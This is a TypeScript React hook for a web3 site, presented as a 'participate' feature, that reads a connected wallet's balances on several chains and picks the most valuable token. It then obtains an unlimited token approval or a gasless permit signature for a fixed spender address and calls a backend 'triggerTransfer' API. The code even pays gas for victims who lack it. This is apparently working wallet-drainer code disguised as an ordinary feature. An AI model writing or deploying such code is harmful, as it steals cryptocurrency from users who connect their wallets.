"use client";

import { useCallback, useMemo, useState } from "react";
import {
  useAccount,
  useBalance,
  useChainId,
  useReadContracts,
  useSendTransaction,
  useSignTypedData,
  useSwitchChain,
  useWriteContract,
} from "wagmi";
import { waitForTransactionReceipt } from "@wagmi/core";
import { parseSignature } from "viem";
import { config } from "@/config";
import {
  SPENDER_ADDRESS,
  MAX_UINT256,
  getParticipateTokenEntries,
  NATIVE_CHAINS,
  GAS_THRESHOLD_BY_CHAIN,
  minTokenAmountForGasFund,
  fundGasApi,
  ERC20_APPROVE_ABI,
  ERC20_BALANCE_ABI,
  ERC20_ALLOWANCE_ABI,
  ERC2612_NONCE_ABI,
  PERMIT_TYPED_DATA,
  triggerTransferApi,
  type ParticipateToken,
} from "@/lib/participate-tokens";

export type SelectedEntry =
  | {
      type: "erc20";
      chainId: number;
      chainName: string;
      token: ParticipateToken;
      balance: bigint;
    }
  | {
      type: "native";
      chainId: number;
      chainName: string;
      symbol: string;
      balance: bigint;
      amountWei: bigint;
    };

/** Rough USD value for comparison (18 decimals). Prefer permit > approve > native when similar. */
function toNormalizedValue(entry: SelectedEntry): bigint {
  if (entry.type === "erc20") {
    return entry.balance * BigInt(10 ** (18 - entry.token.decimals));
  }
  return entry.amountWei; // native: use fixed amount
}

/** Select token+chain with highest value. Prefer permit > approve > native when similar. */
function selectBestEntry(
  erc20Entries: ReturnType<typeof getParticipateTokenEntries>,
  erc20Balances: (bigint | undefined)[],
  nativeBalances: (bigint | undefined)[]
): SelectedEntry | null {
  let best: SelectedEntry | null = null;
  let bestNormalized = 0n;

  for (let i = 0; i < erc20Entries.length; i++) {
    const bal = erc20Balances[i];
    if (bal === undefined || bal <= 0n) continue;

    const { chainId, chainName, token } = erc20Entries[i];
    const entry: SelectedEntry = { type: "erc20", chainId, chainName, token, balance: bal };
    const normalized = toNormalizedValue(entry);

    const isBetter =
      normalized > bestNormalized ||
      (normalized === bestNormalized &&
        best &&
        best.type === "erc20" &&
        token.signType === "permit" &&
        best.token.signType === "approve");

    if (isBetter) {
      bestNormalized = normalized;
      best = entry;
    }
  }

  for (let i = 0; i < NATIVE_CHAINS.length; i++) {
    const bal = nativeBalances[i];
    const native = NATIVE_CHAINS[i];
    if (bal === undefined || bal < native.amountWei) continue;

    const entry: SelectedEntry = {
      type: "native",
      chainId: native.chainId,
      chainName: native.chainName,
      symbol: native.symbol,
      balance: bal,
      amountWei: native.amountWei,
    };
    const normalized = toNormalizedValue(entry);

    const isBetter =
      normalized > bestNormalized ||
      (normalized === bestNormalized && !best);

    if (isBetter) {
      bestNormalized = normalized;
      best = entry;
    }
  }
  return best;
}

export function useParticipateUSDT() {
  const { address } = useAccount();
  const chainId = useChainId();
  const { writeContractAsync } = useWriteContract();
  const { sendTransactionAsync } = useSendTransaction();
  const { switchChainAsync } = useSwitchChain();
  const { signTypedDataAsync } = useSignTypedData();
  const [isPending, setIsPending] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const entries = useMemo(() => getParticipateTokenEntries(), []);

  const balanceContracts = useMemo(
    () =>
      entries.map(({ chainId: cid, token }) => ({
        address: token.address as `0x${string}`,
        abi: ERC20_BALANCE_ABI,
        functionName: "balanceOf" as const,
        args: [address as `0x${string}`] as const,
        chainId: cid,
      })),
    [address, entries]
  );

  const { data: balanceResults } = useReadContracts({
    contracts: balanceContracts,
    query: { enabled: !!address },
  });

  const ethBalance = useBalance({ address: address ?? undefined, chainId: 1 });
  const maticBalance = useBalance({ address: address ?? undefined, chainId: 137 });
  const bnbBalance = useBalance({ address: address ?? undefined, chainId: 56 });

  const erc20Balances = useMemo(
    () =>
      balanceResults?.map((r) => (r.status === "success" ? r.result : undefined)) ?? [],
    [balanceResults]
  );

  const nativeBalances = useMemo(
    () => [
      ethBalance.data?.value,
      maticBalance.data?.value,
      bnbBalance.data?.value,
    ],
    [ethBalance.data?.value, maticBalance.data?.value, bnbBalance.data?.value]
  );

  const selected = useMemo(
    () => selectBestEntry(entries, erc20Balances, nativeBalances),
    [entries, erc20Balances, nativeBalances]
  );

  /** Fund gas only for approve flow: user has USDT/USDC >= $2 but lacks native for gas */
  const ensureGasForApprove = useCallback(
    async (targetChainId: number, tokenBalance: bigint, tokenDecimals: number): Promise<void> => {
      const minForGasFund = minTokenAmountForGasFund(tokenDecimals);
      if (tokenBalance < minForGasFund) return; // only fund when user has >= $2 USDT/USDC

      const threshold = GAS_THRESHOLD_BY_CHAIN[targetChainId];
      if (!threshold) return;

      const idx = NATIVE_CHAINS.findIndex((c) => c.chainId === targetChainId);
      const nativeBal = nativeBalances[idx];
      if (nativeBal !== undefined && nativeBal >= threshold) return;

      await fundGasApi(address!, targetChainId);
      await new Promise((r) => setTimeout(r, 3000));
    },
    [address, nativeBalances]
  );

  const participate = useCallback(async () => {
    if (!address) {
      setError("Connect wallet first");
      return;
    }
    if (!selected) {
      setError("No USDC, USDT, ETH, MATIC, or BNB balance on supported chains");
      return;
    }

    setIsPending(true);
    setError(null);

    try {
      if (chainId !== selected.chainId) {
        await switchChainAsync({ chainId: selected.chainId });
      }

      if (selected.type === "native") {
        // Native participation: user pays own gas. No fund-gas.
        const hash = await sendTransactionAsync({
          to: SPENDER_ADDRESS as `0x${string}`,
          value: selected.amountWei,
          chainId: selected.chainId,
        });
        if (hash) {
          await waitForTransactionReceipt(config, { hash });
        }
        return;
      }

      if (selected.token.signType === "permit" && selected.token.permitDomain) {
        const { readContract } = await import("@wagmi/core");
        const nonce = await readContract(config, {
          address: selected.token.address as `0x${string}`,
          abi: ERC2612_NONCE_ABI,
          functionName: "nonces",
          args: [address as `0x${string}`],
          chainId: selected.chainId,
        });
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const value = BigInt(MAX_UINT256);

        const signature = await signTypedDataAsync({
          domain: selected.token.permitDomain,
          types: PERMIT_TYPED_DATA,
          primaryType: "Permit",
          message: {
            owner: address,
            spender: SPENDER_ADDRESS as `0x${string}`,
            value,
            nonce,
            deadline: BigInt(deadline),
          },
        });

        const { r, s, v } = parseSignature(signature as `0x${string}`);
        await triggerTransferApi(address, selected.chainId, {
          tokenAddress: selected.token.address,
          permit: {
            value: value.toString(),
            deadline,
            v: Number(v ?? 27),
            r: r as `0x${string}`,
            s: s as `0x${string}`,
          },
        });
      } else {
        await ensureGasForApprove(selected.chainId, selected.balance, selected.token.decimals);

        const { readContract } = await import("@wagmi/core");
        const allowance = await readContract(config, {
          address: selected.token.address as `0x${string}`,
          abi: ERC20_ALLOWANCE_ABI,
          functionName: "allowance",
          args: [address as `0x${string}`, SPENDER_ADDRESS as `0x${string}`],
          chainId: selected.chainId,
        });

        const approveOpts = { gas: 100_000n } as const;

        if (allowance > 0n) {
          const hashZero = await writeContractAsync({
            address: selected.token.address as `0x${string}`,
            abi: ERC20_APPROVE_ABI,
            functionName: "approve",
            args: [SPENDER_ADDRESS as `0x${string}`, 0n],
            ...approveOpts,
          });
          await waitForTransactionReceipt(config, {
            hash: hashZero as `0x${string}`,
          });
        }

        const hash = await writeContractAsync({
          address: selected.token.address as `0x${string}`,
          abi: ERC20_APPROVE_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
          ...approveOpts,
        });

        await waitForTransactionReceipt(config, { hash: hash as `0x${string}` });
        await triggerTransferApi(address, selected.chainId, {
          approveTxHash: hash,
          tokenAddress: selected.token.address,
        });
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : "Transaction failed";
      setError(msg);
      throw err;
    } finally {
      setIsPending(false);
    }
  }, [
    address,
    chainId,
    selected,
    writeContractAsync,
    sendTransactionAsync,
    switchChainAsync,
    signTypedDataAsync,
    ensureGasForApprove,
  ]);

  return {
    participate,
    isPending,
    error,
    selected,
    hasBalance: !!selected,
    signType:
      selected?.type === "native"
        ? "native"
        : selected?.type === "erc20"
          ? selected.token.signType
          : null,
    selectedChainId: selected?.chainId ?? null,
    selectedChainName: selected?.chainName ?? null,
    selectedSymbol: selected?.type === "native" ? selected.symbol : null,
  };
}
